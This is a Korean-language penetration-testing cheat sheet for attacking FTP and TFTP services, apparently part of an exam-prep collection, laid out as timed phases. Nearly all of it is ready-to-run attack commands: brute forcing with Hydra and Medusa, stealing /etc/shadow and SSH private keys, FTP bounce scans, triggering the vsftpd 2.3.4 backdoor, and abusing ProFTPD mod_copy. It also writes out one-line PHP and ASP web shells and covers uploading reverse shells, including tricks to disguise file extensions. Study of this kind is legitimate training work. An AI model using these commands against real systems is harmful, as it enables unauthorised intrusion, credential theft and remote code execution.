# 📁 FTP ATTACKS (Port 21)

> **목표: FTP 서비스 발견 후 15-20분 내에 접근 권한 확보 또는 정보 수집**

## ⚡ 즉시 실행할 명령어들

### 🚀 FTP 발견 즉시 실행

```bash
# 1. 배너 그래빙 및 버전 확인
nc -nv {IP} 21
telnet {IP} 21

# 2. 익명 로그인 시도
ftp {IP}
# Username: anonymous
# Password: anonymous

# 3. Nmap FTP 스크립트 실행
nmap --script ftp-* -p 21 {IP}

# 4. 익명 접근 빠른 확인
echo "open {IP}" > ftp_commands.txt
echo "user anonymous anonymous" >> ftp_commands.txt
echo "ls" >> ftp_commands.txt
echo "quit" >> ftp_commands.txt
ftp -s:ftp_commands.txt

# 5. TFTP 확인 (UDP 69)
nmap -sU -p 69 {IP}
tftp {IP}
```

### ⚡ 익명 접근 가능시 즉시 실행

```bash
# 디렉토리 구조 확인
ftp {IP}
# 로그인 후:
ls -la
pwd
cd /
ls -la
cd /home
ls -la
cd /var
ls -la

# 파일 다운로드 (중요 파일들)
get passwd
get shadow
get .bash_history
get config.txt
get backup.zip
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (5분)

- [ ] **포트 21 열려있는지 확인** `nmap -p 21 {IP}`
- [ ] **FTP 배너 정보 수집** `nc -nv {IP} 21`
- [ ] **FTP 서버 버전 확인** `nmap -sV -p 21 {IP}`
- [ ] **NSE 스크립트 실행** `nmap --script ftp-* -p 21 {IP}`
- [ ] **TFTP 서비스 확인** `nmap -sU -p 69 {IP}`

### 🔓 Phase 2: 익명 접근 확인 (3분)

- [ ] **익명 로그인 시도** `ftp {IP}` (anonymous/anonymous)
- [ ] **익명 로그인 시도 변형** (anonymous/guest, anonymous/ftp)
- [ ] **디렉토리 권한 확인** `ls -la`
- [ ] **업로드 권한 확인** `put test.txt`
- [ ] **중요 파일 존재 확인** `ls /etc/passwd`

### 🔍 Phase 3: 열거 및 정보 수집 (7분)

- [ ] **전체 디렉토리 구조 매핑**
- [ ] **읽기 가능한 파일들 다운로드**
- [ ] **사용자 홈 디렉토리 확인**
- [ ] **웹 루트 디렉토리 확인** (var/www, htdocs)
- [ ] **백업 파일들 검색**

### 💥 Phase 4: 공격 및 익스플로잇 (5분)

- [ ] **브루트포스 공격** (익명 접근 실패시)
- [ ] **파일 업로드 시도** (업로드 권한 있는 경우)
- [ ] **바운스 공격 시도**
- [ ] **다른 서비스와 연계 공격**

---

## 🎯 상황별 대응

### 🔓 익명 접근 성공시

```bash
# FTP 연결
ftp {IP}
# Username: anonymous
# Password: anonymous

# 시스템 정보 수집
quote syst
quote stat
quote help

# 디렉토리 탐색 체크리스트
ls -la
cd /
ls -la
cd /etc
ls -la
cd /home
ls -la
cd /var
ls -la
cd /tmp
ls -la
cd /usr
ls -la

# 중요 파일 다운로드
get /etc/passwd
get /etc/shadow
get /etc/group
get /etc/hosts
get /root/.ssh/id_rsa
get /home/*/.ssh/id_rsa

# 웹 루트 확인 (웹 서비스가 있는 경우)
cd /var/www
ls -la
cd /var/www/html
ls -la
cd /htdocs
ls -la

# 백업 파일 검색
ls *.bak
ls *.backup
ls *.old
ls *.txt
ls *.zip
ls *.tar.gz
```

### 📤 업로드 권한 있는 경우

```bash
# 업로드 테스트
echo "test file" > test.txt
put test.txt
ls -la

# 웹쉘 업로드 (웹 서비스와 연계)
# PHP 웹쉘
echo '<?php system($_GET["cmd"]); ?>' > shell.php
put shell.php /var/www/html/shell.php

# ASP 웹쉘
echo '<%eval request("cmd")%>' > shell.asp
put shell.asp /var/www/shell.asp

# 리버스쉘 스크립트 업로드
put reverse-shell.php /var/www/html/
put reverse-shell.aspx /var/www/html/

# 실행 가능한 파일 업로드
put nc.exe /tmp/
put linpeas.sh /tmp/
chmod +x /tmp/linpeas.sh
```

### 🚫 익명 접근 실패시 (브루트포스)

```bash
# Hydra를 이용한 브루트포스
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{IP}
hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://{IP}
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://{IP}

# 일반적인 사용자명으로 브루트포스
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://{IP}

# 특정 사용자 발견시 (다른 서비스에서 수집한 정보)
hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ftp://{IP}

# Medusa 사용
medusa -h {IP} -u admin -P /usr/share/wordlists/rockyou.txt -M ftp

# Nmap 브루트포스 스크립트
nmap --script ftp-brute -p 21 {IP}
```

### 🔄 FTP 바운스 공격

```bash
# 포트 스캔에 FTP 바운스 활용
nmap -b anonymous:anonymous@{FTP_IP} {TARGET_IP}

# 내부 네트워크 스캔
nmap -b anonymous:anonymous@{FTP_IP} 192.168.1.0/24

# 특정 포트 스캔
nmap -b anonymous:anonymous@{FTP_IP} -p 22,80,443 {TARGET_IP}
```

### 🗂️ vsftpd 2.3.4 백도어 (특정 버전)

```bash
# vsftpd 2.3.4 백도어 확인
nmap --script ftp-vsftpd-backdoor -p 21 {IP}

# 수동 백도어 트리거
telnet {IP} 21
USER admin:)
PASS password

# 백도어 포트 확인 (6200)
telnet {IP} 6200
nc -nv {IP} 6200
```

### 📊 ProFTPD 취약점

```bash
# ProFTPD mod_copy 취약점 (CVE-2015-3306)
telnet {IP} 21
site cpfr /etc/passwd
site cpto /var/www/html/passwd.txt

# 파일 복사 후 웹에서 확인
curl http://{IP}/passwd.txt

# ProFTPD 1.3.5 취약점
nmap --script ftp-proftpd-backdoor -p 21 {IP}
```

---

## 🚨 문제 해결

### 🔒 연결이 안 될 때

```bash
# 다른 FTP 포트 확인
nmap -p 20-21,990,991 {IP}

# Passive 모드 시도
ftp {IP}
quote pasv

# Active 모드 시도
ftp {IP}
quote port

# 다른 FTP 클라이언트 사용
lftp {IP}
ncftp {IP}
```

### 📁 디렉토리 접근 거부시

```bash
# 경로 변경 시도
cd ..
cd ../..
cd /
cd ~

# 숨겨진 파일 확인
ls -a
ls -la

# 다른 디렉토리 직접 접근
cd /var
cd /tmp
cd /home
cd /usr/local
```

### 📤 업로드 실패시

```bash
# 바이너리 모드로 변경
binary

# ASCII 모드로 변경
ascii

# 다른 디렉토리에 업로드 시도
cd /tmp
put test.txt

cd /var/tmp
put test.txt

cd /upload
put test.txt

# 파일명 변경하여 시도
put shell.php shell.txt
put shell.php image.jpg
put shell.php index.html
```

### 🐌 느린 연결시

```bash
# 패시브 모드 사용
ftp {IP}
passive

# 연결 시간 초과 설정
ftp -i {IP}

# lftp 사용 (더 빠른 클라이언트)
lftp ftp://{IP}
```

### 🔍 권한 부족시

```bash
# 읽기 전용 파일들 확인
ls -la
find . -type f -readable

# 실행 가능한 파일들 확인
find . -type f -executable

# 다른 사용자 홈 디렉토리 확인
cd /home/user1
cd /home/user2
cd /home/admin
```

---

## 🔧 TFTP 공격 (UDP 69)

### 📡 TFTP 서비스 확인

```bash
# TFTP 서비스 확인
nmap -sU -p 69 {IP}
nmap --script tftp-enum -p 69 {IP}

# TFTP 연결 시도
tftp {IP}
connect {IP}
status
```

### 📥 TFTP 파일 다운로드

```bash
# 기본 파일들 다운로드 시도
tftp {IP}
get passwd
get shadow
get hosts
get config.txt
get backup.cfg

# Windows 파일들 (Windows TFTP)
get boot.ini
get sam
get system
get security
```

### 📤 TFTP 파일 업로드

```bash
# 업로드 테스트
echo "test" > test.txt
tftp {IP}
put test.txt

# 페이로드 업로드
put reverse-shell.exe
put nc.exe
put payload.php
```

---

## 🔗 다른 서비스와 연계

### 🌐 웹 서비스와 연계

```bash
# FTP로 웹쉘 업로드 후 접근
put shell.php /var/www/html/shell.php
curl http://{IP}/shell.php?cmd=whoami

# 설정 파일 다운로드 후 분석
get /var/www/html/config.php
cat config.php | grep -i password
```

### 🔐 SSH와 연계

```bash
# SSH 키 파일 다운로드
get /home/user/.ssh/id_rsa
get /root/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@{IP}

# 알려진 호스트 파일 확인
get /home/user/.ssh/known_hosts
```

### 🗄️ 데이터베이스와 연계

```bash
# 데이터베이스 설정 파일 확인
get /var/www/html/wp-config.php
get /var/www/html/config.inc.php
get /etc/mysql/my.cnf

# 백업 파일에서 크레덴셜 추출
get database_backup.sql
grep -i password database_backup.sql
```

---

## ⏱️ 시간 관리 가이드

### 🎯 5분 안에 완료할 것들

- [ ] 기본 FTP 정보 수집
- [ ] 익명 로그인 시도
- [ ] NSE 스크립트 실행
- [ ] TFTP 서비스 확인

### 🔍 15분 안에 완료할 것들

- [ ] 모든 접근 가능한 파일 확인
- [ ] 중요 파일들 다운로드
- [ ] 업로드 권한 테스트
- [ ] 다른 서비스와 연계 확인

### 💥 20분 후 판단 기준

**성공 기준:**

- [ ] 시스템 파일 접근 성공
- [ ] 웹쉘 업로드 성공
- [ ] 크레덴셜 정보 획득
- [ ] 다른 서비스 접근 가능

**실패시 다음 단계:**

- [ ] 다른 포트로 이동
- [ ] 수집한 정보로 다른 공격 벡터 시도
- [ ] 브루트포스 백그라운드 실행 후 다른 서비스 공격

**다음 단계**: 성공시 쉘 획득을 위해 `SHELLS/` 폴더로, 실패시 다른 `PORT-ATTACKS/` 파일로 이동!
